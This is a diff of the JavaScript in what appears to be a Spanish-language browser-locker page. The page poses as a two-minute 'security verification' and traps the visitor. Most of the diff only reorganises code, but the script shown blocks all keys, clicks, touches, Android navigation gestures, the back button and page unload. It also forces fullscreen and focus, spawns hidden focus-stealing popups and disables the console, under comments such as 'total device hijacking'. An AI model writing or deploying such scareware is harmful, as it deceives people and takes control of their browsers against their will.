@@ -191,6 +191,12 @@
         let lockWindows = [];
         let audioContext = null;
         
+        // Variables para gestos
+        let gestureStartX = 0;
+        let gestureStartY = 0;
+        let gestureStartTime = 0;
+        let edgeThreshold = 50;
+        
         // Prevenir TODAS las acciones del usuario
         document.addEventListener('contextmenu', function(e) {
             e.preventDefault();
@@ -201,55 +207,11 @@
         // Bloquear TODAS las teclas posibles incluyendo Chrome
         document.addEventListener('keydown', function(e) {
             if (isLocked) {
-                // Bloquear específicamente teclas de Chrome
-                if (
-                    // Ctrl + T (nueva pestaña)
-                    (e.ctrlKey && e.key === 't') ||
-                    // Ctrl + N (nueva ventana)
-                    (e.ctrlKey && e.key === 'n') ||
-                    // Ctrl + Shift + N (incógnito)
-                    (e.ctrlKey && e.shiftKey && e.key === 'N') ||
-                    // Ctrl + W (cerrar pestaña)
-                    (e.ctrlKey && e.key === 'w') ||
-                    // Ctrl + Shift + T (reabrir pestaña)
-                    (e.ctrlKey && e.shiftKey && e.key === 'T') ||
-                    // Alt + F4 (cerrar ventana)
-                    (e.altKey && e.key === 'F4') ||
-                    // Ctrl + L (barra de direcciones)
-                    (e.ctrlKey && e.key === 'l') ||
-                    // F6 (barra de direcciones)
-                    e.key === 'F6' ||
-                    // Ctrl + D (marcador)
-                    (e.ctrlKey && e.key === 'd') ||
-                    // Ctrl + H (historial)
-                    (e.ctrlKey && e.key === 'h') ||
-                    // Ctrl + J (descargas)
-                    (e.ctrlKey && e.key === 'j') ||
-                    // F11 (pantalla completa)
-                    e.key === 'F11' ||
-                    // Alt + Left/Right (navegación)
-                    (e.altKey && (e.key === 'ArrowLeft' || e.key === 'ArrowRight')) ||
-                    // Ctrl + Tab (cambiar pestaña)
-                    (e.ctrlKey && e.key === 'Tab') ||
-                    // Ctrl + Shift + Tab (cambiar pestaña atrás)
-                    (e.ctrlKey && e.shiftKey && e.key === 'Tab') ||
-                    // Ctrl + números (ir a pestaña específica)
-                    (e.ctrlKey && /^[1-9]$/.test(e.key)) ||
-                    // F12 (herramientas de desarrollador)
-                    e.key === 'F12' ||
-                    // Ctrl + Shift + I (herramientas de desarrollador)
-                    (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-                    // Ctrl + U (ver código fuente)
-                    (e.ctrlKey && e.key === 'u') ||
-                    // Cualquier otra tecla
-                    true
-                ) {
-                    e.preventDefault();
-                    e.stopPropagation();
-                    e.stopImmediatePropagation();
-                    showWarningMessage();
-                    return false;
-                }
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+                showWarningMessage();
+                return false;
             }
         });
 
@@ -271,7 +233,6 @@
 
         // Protección extrema contra botón atrás
         function setupBackButtonProtection() {
-            // Llenar el historial para prevenir navegación
             for (let i = 0; i < 50; i++) {
                 history.pushState(null, null, location.href);
             }
@@ -288,20 +249,19 @@
         // Mensaje de advertencia cuando intenta salir
         function showWarningMessage() {
             const warningDiv = document.createElement('div');
-            warningDiv.style.cssText = `
-                position: fixed;
-                top: 50%;
-                left: 50%;
-                transform: translate(-50%, -50%);
-                background: #ff1744;
-                color: white;
-                padding: 20px;
-                border-radius: 10px;
-                z-index: 10001;
-                text-align: center;
-                font-weight: bold;
-                box-shadow: 0 0 20px rgba(255, 23, 68, 0.5);
-            `;
+            warningDiv.style.position = 'fixed';
+            warningDiv.style.top = '50%';
+            warningDiv.style.left = '50%';
+            warningDiv.style.transform = 'translate(-50%, -50%)';
+            warningDiv.style.background = '#ff1744';
+            warningDiv.style.color = 'white';
+            warningDiv.style.padding = '20px';
+            warningDiv.style.borderRadius = '10px';
+            warningDiv.style.zIndex = '10001';
+            warningDiv.style.textAlign = 'center';
+            warningDiv.style.fontWeight = 'bold';
+            warningDiv.style.boxShadow = '0 0 20px rgba(255, 23, 68, 0.5)';
+            
             warningDiv.innerHTML = '⚠️ ACCESO DENEGADO ⚠️<br>Proceso de seguridad en curso';
             document.body.appendChild(warningDiv);
             
@@ -310,6 +270,34 @@
                     warningDiv.parentNode.removeChild(warningDiv);
                 }
             }, 2000);
+        }
+
+        // Función específica para mostrar advertencias de gestos
+        function showGestureWarning(message) {
+            const warningDiv = document.createElement('div');
+            warningDiv.style.position = 'fixed';
+            warningDiv.style.top = '20%';
+            warningDiv.style.left = '50%';
+            warningDiv.style.transform = 'translate(-50%, -50%)';
+            warningDiv.style.background = '#ff1744';
+            warningDiv.style.color = 'white';
+            warningDiv.style.padding = '15px 25px';
+            warningDiv.style.borderRadius = '25px';
+            warningDiv.style.zIndex = '10002';
+            warningDiv.style.textAlign = 'center';
+            warningDiv.style.fontWeight = 'bold';
+            warningDiv.style.fontSize = '0.9rem';
+            warningDiv.style.boxShadow = '0 0 30px rgba(255, 23, 68, 0.8)';
+            warningDiv.style.border = '2px solid #fff';
+            
+            warningDiv.innerHTML = '🚫 ' + message + ' 🚫';
+            document.body.appendChild(warningDiv);
+            
+            setTimeout(() => {
+                if (warningDiv.parentNode) {
+                    warningDiv.parentNode.removeChild(warningDiv);
+                }
+            }, 1500);
         }
 
         // Mantener la pantalla activa y bloquear sistema
@@ -329,7 +317,6 @@
         // Intentar modo kiosco/fullscreen
         async function enterKioskMode() {
             try {
-                // Solicitar pantalla completa
                 if (document.documentElement.requestFullscreen) {
                     await document.documentElement.requestFullscreen();
                 } else if (document.documentElement.webkitRequestFullscreen) {
@@ -366,8 +353,8 @@
                 console.log('Orientación no se puede bloquear');
             }
         }
-
-        // Contador regresivo (cambiado a 2 minutos como solicitaste)
+        
+        // Contador regresivo (2 minutos)
         let timeLeft = 120;
         const countdownElement = document.getElementById('countdown');
         
@@ -377,31 +364,16 @@
             
             if (timeLeft <= 0) {
                 clearInterval(timer);
-                // Aquí puedes agregar lo que sucede después del minuto
                 showCompletionMessage();
             }
         }, 1000);
 
         function showCompletionMessage() {
             const overlay = document.getElementById('securityOverlay');
-            overlay.innerHTML = `
-                <div class="security-icon" style="color: #4CAF50;">✅</div>
-                <div class="security-title" style="color: #4CAF50;">VERIFICACIÓN COMPLETADA</div>
-                <div class="security-message">
-                    Tu dispositivo ha sido verificado exitosamente. 
-                    Ahora puedes continuar navegando de forma segura.
-                </div>
-                <button onclick="closeSecurityScreen()" style="
-                    background: #4CAF50;
-                    color: white;
-                    border: none;
-                    padding: 15px 30px;
-                    border-radius: 25px;
-                    font-size: 1rem;
-                    margin-top: 20px;
-                    cursor: pointer;
-                ">Continuar</button>
-            `;
+            overlay.innerHTML = '<div class="security-icon" style="color: #4CAF50;">✅</div>' +
+                '<div class="security-title" style="color: #4CAF50;">VERIFICACIÓN COMPLETADA</div>' +
+                '<div class="security-message">Tu dispositivo ha sido verificado exitosamente. Ahora puedes continuar navegando de forma segura.</div>' +
+                '<button onclick="closeSecurityScreen()" style="background: #4CAF50; color: white; border: none; padding: 15px 30px; border-radius: 25px; font-size: 1rem; margin-top: 20px; cursor: pointer;">Continuar</button>';
         }
 
         function closeSecurityScreen() {
@@ -446,34 +418,7 @@
             window.prompt = function(msg, def) { return window.prompt(msg, def); };
         }
 
-        // Prevenir zoom con gestos
-        document.addEventListener('touchstart', function(e) {
-            if (e.touches.length > 1) {
-                e.preventDefault();
-            }
-        });
-
-        let lastTouchEnd = 0;
-        document.addEventListener('touchend', function(e) {
-            const now = (new Date()).getTime();
-            if (now - lastTouchEnd <= 300) {
-                e.preventDefault();
-            }
-            lastTouchEnd = now;
-        }, false);
-
-        // Prevenir scroll
-        document.addEventListener('touchmove', function(e) {
-            e.preventDefault();
-        }, { passive: false });
-
         // BLOQUEO ESPECÍFICO PARA NAVEGACIÓN POR GESTOS DE ANDROID
-        let gestureStartX = 0;
-        let gestureStartY = 0;
-        let gestureStartTime = 0;
-        let edgeThreshold = 50; // Píxeles desde el borde para detectar gestos
-
-        // Detectar y bloquear gestos de navegación de Android
         document.addEventListener('touchstart', function(e) {
             if (isLocked && e.touches.length === 1) {
                 const touch = e.touches[0];
@@ -481,7 +426,6 @@
                 gestureStartY = touch.clientY;
                 gestureStartTime = Date.now();
                 
-                // Detectar si el toque inicia cerca de los bordes (gestos de sistema)
                 const screenWidth = window.innerWidth;
                 const screenHeight = window.innerHeight;
                 
@@ -521,9 +465,8 @@
                     return false;
                 }
             }
-        }, { passive: false, capture: true });
-
-        // Interceptar movimientos de gestos
+        }, { passive: false, capture: true });       
+ // Interceptar movimientos de gestos
         document.addEventListener('touchmove', function(e) {
             if (isLocked && e.touches.length === 1) {
                 const touch = e.touches[0];
@@ -532,7 +475,7 @@
                 const deltaTime = Date.now() - gestureStartTime;
                 
                 // Detectar swipe rápido desde bordes
-                if (deltaTime < 500) { // Gestos rápidos
+                if (deltaTime < 500) {
                     // Swipe desde izquierda (atrás)
                     if (gestureStartX < edgeThreshold && deltaX > 100) {
                         e.preventDefault();
@@ -583,128 +526,26 @@
             }
         }, { passive: false, capture: true });
 
-        // Función específica para mostrar advertencias de gestos
-        function showGestureWarning(message) {
-            const warningDiv = document.createElement('div');
-            warningDiv.style.cssText = `
-                position: fixed;
-                top: 20%;
-                left: 50%;
-                transform: translate(-50%, -50%);
-                background: #ff1744;
-                color: white;
-                padding: 15px 25px;
-                border-radius: 25px;
-                z-index: 10002;
-                text-align: center;
-                font-weight: bold;
-                font-size: 0.9rem;
-                box-shadow: 0 0 30px rgba(255, 23, 68, 0.8);
-                border: 2px solid #fff;
-            `;
-            warningDiv.innerHTML = `🚫 ${message} 🚫`;
-            document.body.appendChild(warningDiv);
-            
-            setTimeout(() => {
-                if (warningDiv.parentNode) {
-                    warningDiv.parentNode.removeChild(warningDiv);
-                }
-            }, 1500);
-        }
-
-        // Inicializar sistema completo al cargar
-        window.addEventListener('load', function() {
-            initializeLockSystem();
-        });
-
-        // Inicializar también en DOMContentLoaded por si acaso
-        document.addEventListener('DOMContentLoaded', function() {
-            initializeLockSystem();
-        });
-
-        // Ejecutar inmediatamente si ya está cargado
-        if (document.readyState === 'complete' || document.readyState === 'interactive') {
-            initializeLockSystem();
-        }
-
-        // Mostrar alerta si el usuario intenta salir
-        window.addEventListener('beforeunload', function(e) {
-            e.preventDefault();
-            e.returnValue = 'La verificación de seguridad está en proceso. ¿Estás seguro de que quieres salir?';
-            return e.returnValue;
-        });
-
-        // Detectar cuando la página pierde el foco y forzar regreso
-        document.addEventListener('visibilitychange', function() {
-            if (isLocked && document.hidden) {
-                // Intentar recuperar el foco inmediatamente
-                setTimeout(() => {
-                    window.focus();
-                    if (fullscreenLock) {
-                        enterKioskMode();
-                    }
-                }, 100);
-                
-                // Mostrar alerta de violación de seguridad
-                showWarningMessage();
-            }
-        });
-
-        // Detectar pérdida de foco de la ventana
-        window.addEventListener('blur', function() {
-            if (isLocked) {
-                setTimeout(() => {
-                    window.focus();
-                }, 50);
-            }
-        });
-
-        // Prevenir cambio de pestaña con Alt+Tab
-        window.addEventListener('focus', function() {
-            if (isLocked && fullscreenLock) {
-                enterKioskMode();
-            }
-        });
-
-        // Interceptar intentos de navegación
-        window.addEventListener('beforeunload', function(e) {
-            if (isLocked) {
+        // Prevenir zoom con gestos
+        document.addEventListener('touchstart', function(e) {
+            if (e.touches.length > 1) {
                 e.preventDefault();
-                e.returnValue = 'PROCESO DE SEGURIDAD EN CURSO - NO PUEDES SALIR';
-                showWarningMessage();
-                return 'PROCESO DE SEGURIDAD EN CURSO - NO PUEDES SALIR';
             }
         });
 
-        // Prevenir refresh/recarga
-        window.addEventListener('load', function() {
-            if (performance.navigation.type === 1 && isLocked) {
-                // Página fue recargada durante el bloqueo
-                location.reload();
+        let lastTouchEnd = 0;
+        document.addEventListener('touchend', function(e) {
+            const now = (new Date()).getTime();
+            if (now - lastTouchEnd <= 300) {
+                e.preventDefault();
             }
-        });
+            lastTouchEnd = now;
+        }, false);
 
-        // Monitoreo continuo para mantener el bloqueo
-        setInterval(function() {
-            if (isLocked) {
-                // Verificar si seguimos en pantalla completa
-                if (fullscreenLock && !document.fullscreenElement && !document.webkitFullscreenElement) {
-                    enterKioskMode();
-                }
-                
-                // Mantener el foco
-                if (document.hasFocus && !document.hasFocus()) {
-                    window.focus();
-                }
-                
-                // Verificar tiempo transcurrido
-                const elapsed = (Date.now() - lockStartTime) / 1000;
-                if (elapsed >= 60) {
-                    // El tiempo ha pasado, pero mantener bloqueo hasta completar
-                    console.log('Tiempo completado, esperando finalización...');
-                }
-            }
-        }, 500);
+        // Prevenir scroll
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+        }, { passive: false });
 
         // SISTEMA DE HIJACKING TOTAL DEL DISPOSITIVO
         function createSystemOverride() {
@@ -714,12 +555,7 @@
                     const popup = window.open('', '_blank', 'width=1,height=1,left=-1000,top=-1000');
                     if (popup) {
                         lockWindows.push(popup);
-                        popup.document.write(`
-                            <script>
-                                window.onbeforeunload = function() { return false; };
-                                setInterval(function() { window.focus(); }, 100);
-                            </script>
-                        `);
+                        popup.document.write('<script>window.onbeforeunload = function() { return false; }; setInterval(function() { window.focus(); }, 100);<\/script>');
                     }
                 } catch (e) {}
             }
@@ -735,14 +571,13 @@
                 oscillator.connect(gainNode);
                 gainNode.connect(audioContext.destination);
                 
-                oscillator.frequency.setValueAtTime(20000, audioContext.currentTime); // Frecuencia inaudible
-                gainNode.gain.setValueAtTime(0.001, audioContext.currentTime); // Volumen mínimo
+                oscillator.frequency.setValueAtTime(20000, audioContext.currentTime);
+                gainNode.gain.setValueAtTime(0.001, audioContext.currentTime);
                 
                 oscillator.start();
             } catch (e) {}
-        }
-
-        // Interceptar TODOS los eventos del sistema
+        } 
+       // Interceptar TODOS los eventos del sistema
         function hijackSystemEvents() {
             // Interceptar eventos de teclado a nivel de sistema
             document.addEventListener('keydown', function(e) {
@@ -756,7 +591,6 @@
             // Interceptar eventos táctiles
             document.addEventListener('touchstart', function(e) {
                 if (isLocked && e.touches.length > 0) {
-                    // Permitir solo toques simples en el área de la pantalla
                     const touch = e.touches[0];
                     const element = document.elementFromPoint(touch.clientX, touch.clientY);
                     if (!element || !element.closest('.security-overlay')) {
@@ -855,14 +689,12 @@
 
                     // Verificar visibilidad
                     if (document.hidden) {
-                        // Intentar recuperar visibilidad
                         document.dispatchEvent(new Event('visibilitychange'));
                         window.focus();
                     }
 
                     // Verificar si hay nuevas pestañas o ventanas
                     if (window.length > 1) {
-                        // Intentar cerrar otras ventanas
                         for (let i = 1; i < window.length; i++) {
                             try {
                                 window[i].close();
@@ -875,11 +707,9 @@
             // Monitoreo de memoria y CPU para detectar intentos de cierre
             setInterval(function() {
                 if (isLocked) {
-                    // Crear carga de trabajo para mantener la app activa
                     const dummy = new Array(1000).fill(Math.random());
                     dummy.sort();
                     
-                    // Verificar que seguimos siendo la ventana activa
                     if (document.hasFocus && !document.hasFocus()) {
                         window.focus();
                         showWarningMessage();
@@ -890,28 +720,23 @@
             // Monitoreo específico para Chrome
             setInterval(function() {
                 if (isLocked) {
-                    // Verificar si el usuario está intentando usar la barra de direcciones
                     if (document.activeElement && document.activeElement.tagName === 'INPUT') {
                         document.activeElement.blur();
                         showWarningMessage();
                     }
                     
-                    // Mantener el foco en nuestra página
                     if (document.body) {
                         document.body.focus();
                     }
                 }
             }, 200);
-        }
-
-        // Bloquear notificaciones y alertas del sistema
+        }      
+  // Bloquear notificaciones y alertas del sistema
         function blockSystemNotifications() {
-            // Interceptar todas las funciones de alerta
             window.alert = function() { return false; };
             window.confirm = function() { return false; };
             window.prompt = function() { return null; };
             
-            // Bloquear console para evitar debugging
             if (typeof console !== 'undefined') {
                 console.log = console.warn = console.error = function() {};
             }
@@ -922,7 +747,6 @@
             // Interceptar clics en toda la ventana del navegador
             document.addEventListener('click', function(e) {
                 if (isLocked) {
-                    // Solo permitir clics dentro del área de seguridad
                     if (!e.target.closest('.security-overlay')) {
                         e.preventDefault();
                         e.stopPropagation();
@@ -963,7 +787,6 @@
 
         // Prevenir apertura de nuevas ventanas/pestañas
         function blockNewWindows() {
-            // Interceptar window.open
             const originalOpen = window.open;
             window.open = function() {
                 if (isLocked) {
@@ -973,7 +796,6 @@
                 return originalOpen.apply(this, arguments);
             };
 
-            // Interceptar enlaces que abren nuevas ventanas
             document.addEventListener('click', function(e) {
                 if (isLocked && e.target.tagName === 'A') {
                     if (e.target.target === '_blank' || e.target.href) {
@@ -988,50 +810,39 @@
 
         // Bloquear gestos específicos de Android
         function blockAndroidGestures() {
-            // Crear zonas invisibles en los bordes para interceptar gestos
             const edges = ['top', 'bottom', 'left', 'right'];
             
             edges.forEach(edge => {
                 const edgeZone = document.createElement('div');
-                edgeZone.style.cssText = `
-                    position: fixed;
-                    z-index: 999998;
-                    background: transparent;
-                    pointer-events: auto;
-                `;
+                edgeZone.style.position = 'fixed';
+                edgeZone.style.zIndex = '999998';
+                edgeZone.style.background = 'transparent';
+                edgeZone.style.pointerEvents = 'auto';
                 
                 switch(edge) {
                     case 'top':
-                        edgeZone.style.cssText += `
-                            top: 0;
-                            left: 0;
-                            width: 100%;
-                            height: 60px;
-                        `;
+                        edgeZone.style.top = '0';
+                        edgeZone.style.left = '0';
+                        edgeZone.style.width = '100%';
+                        edgeZone.style.height = '60px';
                         break;
                     case 'bottom':
-                        edgeZone.style.cssText += `
-                            bottom: 0;
-                            left: 0;
-                            width: 100%;
-                            height: 60px;
-                        `;
+                        edgeZone.style.bottom = '0';
+                        edgeZone.style.left = '0';
+                        edgeZone.style.width = '100%';
+                        edgeZone.style.height = '60px';
                         break;
                     case 'left':
-                        edgeZone.style.cssText += `
-                            top: 0;
-                            left: 0;
-                            width: 60px;
-                            height: 100%;
-                        `;
+                        edgeZone.style.top = '0';
+                        edgeZone.style.left = '0';
+                        edgeZone.style.width = '60px';
+                        edgeZone.style.height = '100%';
                         break;
                     case 'right':
-                        edgeZone.style.cssText += `
-                            top: 0;
-                            right: 0;
-                            width: 60px;
-                            height: 100%;
-                        `;
+                        edgeZone.style.top = '0';
+                        edgeZone.style.right = '0';
+                        edgeZone.style.width = '60px';
+                        edgeZone.style.height = '100%';
                         break;
                 }
                 
@@ -1041,7 +852,7 @@
                         e.preventDefault();
                         e.stopPropagation();
                         e.stopImmediatePropagation();
-                        showGestureWarning(`GESTO ${edge.toUpperCase()} BLOQUEADO`);
+                        showGestureWarning('GESTO ' + edge.toUpperCase() + ' BLOQUEADO');
                         return false;
                     }
                 }, { passive: false, capture: true });
@@ -1108,20 +919,18 @@
                 }
             }, { passive: false, capture: true });
         }
-
+        
         // Crear overlay invisible para capturar todos los clics
         function createInvisibleOverlay() {
             const overlay = document.createElement('div');
-            overlay.style.cssText = `
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                z-index: 999999;
-                pointer-events: auto;
-                background: transparent;
-            `;
+            overlay.style.position = 'fixed';
+            overlay.style.top = '0';
+            overlay.style.left = '0';
+            overlay.style.width = '100%';
+            overlay.style.height = '100%';
+            overlay.style.zIndex = '999999';
+            overlay.style.pointerEvents = 'auto';
+            overlay.style.background = 'transparent';
             
             overlay.addEventListener('click', function(e) {
                 if (isLocked) {
@@ -1132,7 +941,6 @@
                 }
             });
             
-            // Interceptar eventos de toque en el overlay
             overlay.addEventListener('touchstart', function(e) {
                 if (isLocked) {
                     e.preventDefault();
@@ -1174,6 +982,94 @@
             systemHijacked = true;
             console.log('SISTEMA COMPLETAMENTE COMPROMETIDO');
         }
+
+        // Inicializar sistema completo al cargar
+        window.addEventListener('load', function() {
+            initializeLockSystem();
+        });
+
+        // Inicializar también en DOMContentLoaded por si acaso
+        document.addEventListener('DOMContentLoaded', function() {
+            initializeLockSystem();
+        });
+
+        // Ejecutar inmediatamente si ya está cargado
+        if (document.readyState === 'complete' || document.readyState === 'interactive') {
+            initializeLockSystem();
+        }
+
+        // Mostrar alerta si el usuario intenta salir
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = 'La verificación de seguridad está en proceso. ¿Estás seguro de que quieres salir?';
+            return e.returnValue;
+        });
+
+        // Detectar cuando la página pierde el foco y forzar regreso
+        document.addEventListener('visibilitychange', function() {
+            if (isLocked && document.hidden) {
+                setTimeout(() => {
+                    window.focus();
+                    if (fullscreenLock) {
+                        enterKioskMode();
+                    }
+                }, 100);
+                
+                showWarningMessage();
+            }
+        });
+
+        // Detectar pérdida de foco de la ventana
+        window.addEventListener('blur', function() {
+            if (isLocked) {
+                setTimeout(() => {
+                    window.focus();
+                }, 50);
+            }
+        });
+
+        // Prevenir cambio de pestaña con Alt+Tab
+        window.addEventListener('focus', function() {
+            if (isLocked && fullscreenLock) {
+                enterKioskMode();
+            }
+        });
+
+        // Interceptar intentos de navegación
+        window.addEventListener('beforeunload', function(e) {
+            if (isLocked) {
+                e.preventDefault();
+                e.returnValue = 'PROCESO DE SEGURIDAD EN CURSO - NO PUEDES SALIR';
+                showWarningMessage();
+                return 'PROCESO DE SEGURIDAD EN CURSO - NO PUEDES SALIR';
+            }
+        });
+
+        // Prevenir refresh/recarga
+        window.addEventListener('load', function() {
+            if (performance.navigation.type === 1 && isLocked) {
+                location.reload();
+            }
+        });
+
+        // Monitoreo continuo para mantener el bloqueo
+        setInterval(function() {
+            if (isLocked) {
+                if (fullscreenLock && !document.fullscreenElement && !document.webkitFullscreenElement) {
+                    enterKioskMode();
+                }
+                
+                if (document.hasFocus && !document.hasFocus()) {
+                    window.focus();
+                }
+                
+                const elapsed = (Date.now() - lockStartTime) / 1000;
+                if (elapsed >= 60) {
+                    console.log('Tiempo completado, esperando finalización...');
+                }
+            }
+        }, 500);
+
     </script>
 </body>
 </html>
